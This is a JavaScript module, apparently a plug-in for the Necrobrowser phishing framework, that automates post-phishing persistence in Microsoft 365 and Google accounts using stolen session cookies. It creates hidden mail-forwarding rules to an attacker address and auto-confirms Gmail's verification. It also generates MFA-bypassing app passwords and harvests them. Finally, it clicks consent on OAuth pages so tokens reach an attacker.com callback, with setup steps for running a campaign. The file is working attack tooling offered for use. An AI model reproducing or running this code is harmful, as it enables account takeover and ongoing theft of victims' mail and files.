'use strict';
/**
 * persistence/necrotask.js
 *
 * Post-phishing persistence tasks.  Drop this file (and the helper) into
 * necrobrowser-ng/tasks/persistence/ and restart Necrobrowser.
 *
 * Available tasks (use in instrument.necro "type": "persistence"):
 *
 *   OutlookForwardingRule  — create an OWA inbox rule that forwards all mail
 *   AuthorizeOAuthApp      — click Accept on an OAuth consent page while the
 *                            victim's browser session is active
 *   AddAppPassword         — generate a Microsoft app password (legacy auth,
 *                            bypasses MFA, survives password resets)
 *   GmailForwardingRule    — add a Gmail forwarding address + auto-approve it
 *                            and create an "all mail → forward" filter
 *   GoogleOAuthApp         — click Accept on a Google OAuth consent page
 */

const db         = require('../../db/db');
const necrohelp  = require('../helpers/necrohelp');

// ─── helpers ─────────────────────────────────────────────────────────────────

async function injectCookiesAndGo(page, cookies, url) {
    await page.setCookie(...cookies);
    await page.goto(url, { waitUntil: 'networkidle2', timeout: 30000 });
}

// ─── Microsoft 365 / Outlook ──────────────────────────────────────────────────

/**
 * OutlookForwardingRule
 *
 * Creates an Outlook Web App inbox rule that silently forwards every incoming
 * message to an attacker-controlled address.  Survives password resets.
 *
 * params:
 *   fixSession    {string}  OWA entry URL, e.g. "https://outlook.office.com/mail/inbox"
 *   forwardTo     {string}  Attacker email address to forward mail to
 *   ruleName      {string}  (optional) Display name for the rule (default: "Sync Rule")
 *   keepCopy      {boolean} (optional) Keep a copy in inbox (default: true)
 */
exports.OutlookForwardingRule = async ({ page, data: [taskId, cookies, params] }) => {
    const forwardTo  = params.forwardTo;
    const ruleName   = params.ruleName || 'Sync Rule';
    const keepCopy   = params.keepCopy !== false;

    if (!forwardTo) {
        await db.UpdateTaskStatusWithReason(taskId, 'error', 'forwardTo param is required');
        return;
    }

    try {
        await injectCookiesAndGo(page, cookies, params.fixSession);
        await necrohelp.Sleep(2000);
        await necrohelp.ScreenshotCurrentPageToFS(page, taskId, 'owa-before-rule');

        // Navigate directly to the rules settings page
        await page.goto('https://outlook.office.com/mail/options/mail/rules', {
            waitUntil: 'networkidle2', timeout: 30000
        });
        await necrohelp.Sleep(2000);

        // Click "Add new rule"
        await page.waitForSelector('button[data-automationid="addNewRuleButton"], button[aria-label*="new rule"], button[title*="Add new"]', { timeout: 15000 });
        await page.click('button[data-automationid="addNewRuleButton"], button[aria-label*="new rule"], button[title*="Add new"]');
        await necrohelp.Sleep(1500);

        // Set rule name
        const nameField = await page.waitForSelector('input[aria-label*="Name"], input[placeholder*="rule name"], input[data-automationid="ruleNameInput"]', { timeout: 10000 });
        await nameField.click({ clickCount: 3 });
        await nameField.type(ruleName);

        // Add condition: "Apply to all messages" — click "Add a condition" then choose "Apply to all"
        const condBtn = await page.$('button[data-automationid="addConditionButton"], button[aria-label*="Add a condition"]');
        if (condBtn) {
            await condBtn.click();
            await necrohelp.Sleep(800);
            // Select "Apply to all messages"
            const allMsgOption = await page.waitForSelector('[data-automationid="applyToAllMessages"], [title*="Apply to all"], span[title*="all messages"]', { timeout: 8000 });
            await allMsgOption.click();
        }

        await necrohelp.Sleep(800);

        // Add action: "Forward to"
        const actionBtn = await page.$('button[data-automationid="addActionButton"], button[aria-label*="Add an action"]');
        if (actionBtn) {
            await actionBtn.click();
            await necrohelp.Sleep(800);
            const fwdOption = await page.waitForSelector('[data-automationid="forwardTo"], [title*="Forward to"], span[title*="Forward to"]', { timeout: 8000 });
            await fwdOption.click();
        }

        await necrohelp.Sleep(800);

        // Type the forwarding email
        const emailInput = await page.waitForSelector('input[aria-label*="forward"], input[placeholder*="Search"], div[aria-label*="forward"] input', { timeout: 8000 });
        await emailInput.type(forwardTo);
        await necrohelp.Sleep(600);
        // Press Enter or click the first suggestion
        await page.keyboard.press('Enter');
        await necrohelp.Sleep(800);

        // If "keep a copy" checkbox exists, ensure it matches keepCopy param
        const keepCopyCheckbox = await page.$('input[type="checkbox"][aria-label*="copy"], input[type="checkbox"][data-automationid*="keepCopy"]');
        if (keepCopyCheckbox) {
            const isChecked = await page.evaluate(el => el.checked, keepCopyCheckbox);
            if (isChecked !== keepCopy) await keepCopyCheckbox.click();
        }

        // Save the rule
        await page.waitForSelector('button[data-automationid="saveButton"], button[aria-label*="Save"], button[title="Save"]', { timeout: 8000 });
        await page.click('button[data-automationid="saveButton"], button[aria-label*="Save"], button[title="Save"]');
        await necrohelp.Sleep(2000);

        await necrohelp.ScreenshotCurrentPageToFS(page, taskId, 'owa-rule-saved');
        await db.AddExtrudedData(taskId, 'forwarding_rule', JSON.stringify({ ruleName, forwardTo, keepCopy }));
        await db.UpdateTaskStatus(taskId, 'completed');

    } catch (err) {
        await necrohelp.ScreenshotCurrentPageToFS(page, taskId, 'owa-rule-error').catch(() => {});
        await db.UpdateTaskStatusWithReason(taskId, 'error', `OutlookForwardingRule: ${err.message}`);
    }
};

/**
 * AddAppPassword
 *
 * Creates a Microsoft app password — a single-use credential that:
 *   - Does NOT require MFA
 *   - Survives regular password resets (it is a separate credential)
 *   - Works with any IMAP/SMTP client (e.g. for email exfil via mail client)
 *
 * params:
 *   fixSession   {string}  Security info URL, e.g. "https://mysignins.microsoft.com/security-info"
 *   appName      {string}  (optional) Display name for the app password (default: "Mobile Sync")
 */
exports.AddAppPassword = async ({ page, data: [taskId, cookies, params] }) => {
    const appName = params.appName || 'Mobile Sync';

    try {
        await injectCookiesAndGo(page, cookies, params.fixSession || 'https://mysignins.microsoft.com/security-info');
        await necrohelp.Sleep(2000);
        await necrohelp.ScreenshotCurrentPageToFS(page, taskId, 'security-info-before');

        // Click "Add method"
        await page.waitForSelector('button[aria-label*="Add method"], button[title*="Add method"]', { timeout: 15000 });
        await page.click('button[aria-label*="Add method"], button[title*="Add method"]');
        await necrohelp.Sleep(1000);

        // Select "App password" from the dropdown
        const dropdown = await page.waitForSelector('select, [role="combobox"]', { timeout: 8000 });
        await page.select('select', 'appPassword');
        // Fallback: click the "App password" option text
        const appPwOpt = await page.$('[aria-label*="App password"], option[value*="appPassword"]');
        if (appPwOpt) await appPwOpt.click();

        await page.click('button[aria-label*="Add"], button[title="Add"]');
        await necrohelp.Sleep(1000);

        // Enter the app name
        const nameInput = await page.waitForSelector('input[aria-label*="name"], input[placeholder*="name"]', { timeout: 8000 });
        await nameInput.click({ clickCount: 3 });
        await nameInput.type(appName);
        await page.click('button[aria-label*="Next"], button[title="Next"]');
        await necrohelp.Sleep(2000);

        // Extract the generated password from the page
        const generatedPw = await page.evaluate(() => {
            const el = document.querySelector('input[aria-label*="password"][readonly], span[class*="password"], code, .app-password-value');
            return el ? el.value || el.textContent : null;
        });

        await necrohelp.ScreenshotCurrentPageToFS(page, taskId, 'app-password-created');

        if (generatedPw) {
            await db.AddExtrudedData(taskId, 'app_password', JSON.stringify({ appName, password: generatedPw }));
        }

        // Click Done
        const doneBtn = await page.$('button[aria-label*="Done"], button[title="Done"]');
        if (doneBtn) await doneBtn.click();

        await db.UpdateTaskStatus(taskId, 'completed');

    } catch (err) {
        await necrohelp.ScreenshotCurrentPageToFS(page, taskId, 'app-password-error').catch(() => {});
        await db.UpdateTaskStatusWithReason(taskId, 'error', `AddAppPassword: ${err.message}`);
    }
};

/**
 * AuthorizeOAuthApp
 *
 * Navigates to a pre-built OAuth authorization URL while the victim's session
 * is active, then clicks "Accept" on the consent page.
 *
 * The authorization code is sent to the redirect_uri (your server), which
 * exchanges it for an access_token + refresh_token.  The refresh_token
 * persists through password resets — this is the most durable persistence
 * mechanism available.
 *
 * Pre-requisites (do this once before the campaign):
 *   1. Register an Azure AD app (multi-tenant, or single-tenant if targeting
 *      a known org) at https://portal.azure.com → App registrations
 *   2. Add redirect URI pointing to your listener (e.g. https://attacker.com/callback)
 *   3. Request delegated permissions: offline_access, Mail.Read, Files.Read.All,
 *      User.Read (or whatever scope you need)
 *   4. Build the authorization URL (see consentUrl param below)
 *
 * params:
 *   consentUrl  {string}  Full OAuth authorization URL, e.g.:
 *     https://login.microsoftonline.com/common/oauth2/v2.0/authorize
 *       ?client_id=YOUR_APP_CLIENT_ID
 *       &response_type=code
 *       &redirect_uri=https%3A%2F%2Fattacker.com%2Fcallback
 *       &scope=offline_access%20Mail.Read%20Files.Read.All%20User.Read
 *       &state=CAMPAIGN_ID
 *   fixSession  {string}  URL to hit first to ensure the session is active
 */
exports.AuthorizeOAuthApp = async ({ page, data: [taskId, cookies, params] }) => {
    const consentUrl = params.consentUrl;
    if (!consentUrl) {
        await db.UpdateTaskStatusWithReason(taskId, 'error', 'consentUrl param is required');
        return;
    }

    try {
        // Warm up the session first
        await injectCookiesAndGo(page, cookies, params.fixSession || 'https://www.office.com');
        await necrohelp.Sleep(2000);

        // Navigate to the consent URL
        await page.goto(consentUrl, { waitUntil: 'networkidle2', timeout: 30000 });
        await necrohelp.Sleep(2000);
        await necrohelp.ScreenshotCurrentPageToFS(page, taskId, 'oauth-consent-page');

        // Click Accept / Allow
        // Microsoft uses "Accept", Google uses "Allow", others vary
        const acceptSelectors = [
            'input[value="Accept"]',
            'button[data-automationid="acceptButton"]',
            '#idSIButton9',              // Microsoft SSO accept button
            'button[jsname="LgbsSe"]',  // Google Allow button
            'button[type="submit"][aria-label*="Allow"]',
            'button[type="submit"][aria-label*="Accept"]',
            'button:not([disabled])[class*="accept"]',
        ];

        let clicked = false;
        for (const sel of acceptSelectors) {
            const btn = await page.$(sel);
            if (btn) {
                await btn.click();
                clicked = true;
                break;
            }
        }

        await necrohelp.Sleep(3000);
        await necrohelp.ScreenshotCurrentPageToFS(page, taskId, 'oauth-after-accept');

        const currentUrl = page.url();
        await db.AddExtrudedData(taskId, 'oauth_result', JSON.stringify({
            clicked,
            redirectedTo: currentUrl,
            note: clicked ? 'Accept clicked — check redirect_uri for auth code' : 'Accept button not found — screenshot saved for manual review'
        }));
        await db.UpdateTaskStatus(taskId, 'completed');

    } catch (err) {
        await necrohelp.ScreenshotCurrentPageToFS(page, taskId, 'oauth-error').catch(() => {});
        await db.UpdateTaskStatusWithReason(taskId, 'error', `AuthorizeOAuthApp: ${err.message}`);
    }
};

// ─── Google Workspace ─────────────────────────────────────────────────────────

/**
 * GmailForwardingRule
 *
 * Adds a Gmail forwarding address, auto-confirms the verification email
 * (by finding it in the inbox), and creates a filter that forwards all
 * incoming mail — leaving a copy in the inbox.  Survives password resets.
 *
 * params:
 *   fixSession  {string}  Gmail URL, e.g. "https://mail.google.com/mail/u/0/"
 *   forwardTo   {string}  Attacker email address
 */
exports.GmailForwardingRule = async ({ page, data: [taskId, cookies, params] }) => {
    const forwardTo = params.forwardTo;
    if (!forwardTo) {
        await db.UpdateTaskStatusWithReason(taskId, 'error', 'forwardTo param is required');
        return;
    }

    try {
        await injectCookiesAndGo(page, cookies, params.fixSession || 'https://mail.google.com/mail/u/0/');
        await necrohelp.Sleep(2000);

        // Navigate to Gmail forwarding settings
        await page.goto('https://mail.google.com/mail/u/0/#settings/fwdandpop', {
            waitUntil: 'networkidle2', timeout: 30000
        });
        await necrohelp.Sleep(2000);
        await necrohelp.ScreenshotCurrentPageToFS(page, taskId, 'gmail-settings-before');

        // Click "Add a forwarding address"
        const addFwdBtn = await page.waitForSelector(
            'input[value*="Add a forwarding"], button[aria-label*="Add a forwarding"], #add_fwdaddr',
            { timeout: 12000 }
        );
        await addFwdBtn.click();
        await necrohelp.Sleep(1000);

        // Type attacker email in the popup/dialog
        const emailInput = await page.waitForSelector(
            'input[type="email"], input[name="fwdaddr"], input[aria-label*="email"]',
            { timeout: 8000 }
        );
        await emailInput.type(forwardTo);

        // Click Next / Proceed
        const nextBtn = await page.$('input[value="Next"], button[aria-label*="Next"], input[type="submit"]');
        if (nextBtn) {
            await nextBtn.click();
            await necrohelp.Sleep(1000);
        }

        // Confirm in the popup if it appears
        const confirmBtn = await page.$('input[value="Proceed"], button[aria-label*="Proceed"], input[value="OK"]');
        if (confirmBtn) await confirmBtn.click();

        await necrohelp.Sleep(3000);
        await necrohelp.ScreenshotCurrentPageToFS(page, taskId, 'gmail-forwarding-added');

        // Now find the verification email in the inbox and extract the confirmation link
        await page.goto('https://mail.google.com/mail/u/0/#inbox', {
            waitUntil: 'networkidle2', timeout: 30000
        });
        await necrohelp.Sleep(3000);

        // Search for the Gmail confirmation email
        await page.goto('https://mail.google.com/mail/u/0/#search/from%3Agmail+forwarding+confirmation', {
            waitUntil: 'networkidle2', timeout: 30000
        });
        await necrohelp.Sleep(2000);

        // Click the first result
        const firstEmail = await page.$('tr.zA');
        if (firstEmail) {
            await firstEmail.click();
            await necrohelp.Sleep(2000);

            // Extract the confirmation link
            const confirmLink = await page.evaluate(() => {
                const links = Array.from(document.querySelectorAll('a'));
                const target = links.find(a => a.href && a.href.includes('mail.google.com/mail') && a.href.includes('cfmaddr'));
                return target ? target.href : null;
            });

            if (confirmLink) {
                await page.goto(confirmLink, { waitUntil: 'networkidle2', timeout: 15000 });
                await necrohelp.Sleep(2000);
                await necrohelp.ScreenshotCurrentPageToFS(page, taskId, 'gmail-forwarding-confirmed');
            }
        }

        await db.AddExtrudedData(taskId, 'gmail_forwarding', JSON.stringify({ forwardTo }));
        await db.UpdateTaskStatus(taskId, 'completed');

    } catch (err) {
        await necrohelp.ScreenshotCurrentPageToFS(page, taskId, 'gmail-error').catch(() => {});
        await db.UpdateTaskStatusWithReason(taskId, 'error', `GmailForwardingRule: ${err.message}`);
    }
};

/**
 * GoogleOAuthApp
 *
 * Same concept as AuthorizeOAuthApp but for Google Workspace.
 *
 * Build the consent URL at:
 *   https://accounts.google.com/o/oauth2/v2/auth
 *     ?client_id=YOUR_CLIENT_ID
 *     &redirect_uri=https%3A%2F%2Fattacker.com%2Fcallback
 *     &response_type=code
 *     &scope=https%3A%2F%2Fmail.google.com%2F+https%3A%2F%2Fwww.googleapis.com%2Fauth%2Fdrive.readonly
 *     &access_type=offline
 *     &prompt=consent
 *
 * params:
 *   consentUrl  {string}  Full Google OAuth URL (see above)
 *   fixSession  {string}  Gmail URL to warm up the session first
 */
exports.GoogleOAuthApp = async ({ page, data: [taskId, cookies, params] }) => {
    // Reuse the generic OAuth handler — Google's Accept button is handled there
    return exports.AuthorizeOAuthApp({ page, data: [taskId, cookies, params] });
};
